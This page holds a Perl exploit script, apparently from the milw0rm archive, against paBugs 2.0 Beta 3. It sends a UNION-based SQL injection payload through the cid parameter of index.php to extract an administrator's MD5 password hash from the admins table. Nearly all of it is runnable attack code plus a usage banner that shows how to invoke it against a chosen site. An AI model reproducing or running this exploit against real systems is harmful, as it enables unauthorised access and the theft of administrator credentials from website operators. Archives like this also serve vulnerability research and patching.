<html><head><title>paBugs <= 2.0 Beta 3 (main.php cid) Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
use LWP::UserAgent;
use HTTP::Cookies;

if(@ARGV &lt; 4)
{
    usage();
    exit();
}

$host = $ARGV[0]; # Host
$path = $ARGV[1]; # Path to paBugs directory
$pref = $ARGV[2]; # prefix for admin tables
$usid = $ARGV[3]; # user id

$www = new LWP::UserAgent;
$sql = &quot;$host/$path/index.php?cid=1'+union+select+1,2,3,password,5+from+$pref\_admins+where+id=$usid/*&quot;;
print &quot;\n\n [~] Searching password for user(admin)=$usid \n&quot;;
$res = $www -&gt; get($sql) or err();
$res -&gt; content() =~ /([0-9,a-f]{32})/ or err();
print &quot;\n [+] Admin Password(md5)=$usid is: $1 \n\n&quot;;

sub usage()
{
print &quot;~---------------------------------------------------------~\n&quot;;
print &quot;|                  Bug Found by: umpi                 |\n&quot;;
print &quot;~---------------------------------------------------------~\n&quot;;
print &quot;|    paBugs &lt;= v2.0 Beta 3 Sql-Injection exploit          |\n&quot;;
print &quot;| Usage: pabugs.pl [site] [folder] [prefix] [user_id] |\n&quot;;
print &quot;| Example: pabugs.pl http://localhost /pabugs pa 1              |\n&quot;;
print &quot;| Coded by p-range   // cf-team.net   // p-range.info     |\n&quot;;
print &quot;~---------------------------------------------------------~\n&quot;;
}

sub err()
{
print &quot;\n [-] Site is not vulnerable !&quot;;
exit();
}

# milw0rm.com [2007-08-02]</pre></html>